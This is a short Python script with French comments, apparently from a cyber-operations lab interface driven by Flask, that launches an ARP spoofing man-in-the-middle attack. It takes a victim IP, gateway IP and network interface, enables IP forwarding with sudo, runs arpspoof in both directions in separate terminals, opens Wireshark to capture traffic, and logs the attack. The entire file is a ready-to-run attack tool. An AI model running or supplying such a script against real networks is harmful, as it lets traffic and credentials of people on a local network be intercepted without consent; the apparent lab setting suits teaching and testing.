import subprocess
import sys
import os
from datetime import datetime

# Récupération des arguments passés par Flask
victim_ip = sys.argv[1]
gateway_ip = sys.argv[2]
interface = sys.argv[3]

# Dossier de logs
log_dir = os.path.expanduser("~/ihm_cydops/IHM_CYDOPS/attaque/logs")
os.makedirs(log_dir, exist_ok=True)

# Fichier de log
timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
log_file = os.path.join(log_dir, f"arp_spoof_{timestamp}.txt")

with open(log_file, "w") as f:
    f.write("Début de l'attaque ARP Spoofing / MITM\n")
    f.write(f"Date : {datetime.now()}\n")
    f.write(f"Victime : {victim_ip}\n")
    f.write(f"Passerelle : {gateway_ip}\n")
    f.write(f"Interface : {interface}\n\n")

    # Activation de l'IP forwarding
    subprocess.call(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    f.write("[✔] IP forwarding activé\n")

    # Ouverture des 3 terminaux
    cmd1 = f"sudo arpspoof -i {interface} -t {victim_ip} {gateway_ip}"
    cmd2 = f"sudo arpspoof -i {interface} -t {gateway_ip} {victim_ip}"
    cmd3 = "sudo wireshark"

    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd1])
    f.write(f" Terminal 1 : {cmd1}\n")

    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd2])
    f.write(f" Terminal 2 : {cmd2}\n")

    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd3])
    f.write(f" Terminal 3 : Wireshark\n")

    f.write("\n[+] Attaque MITM en cours...\n")
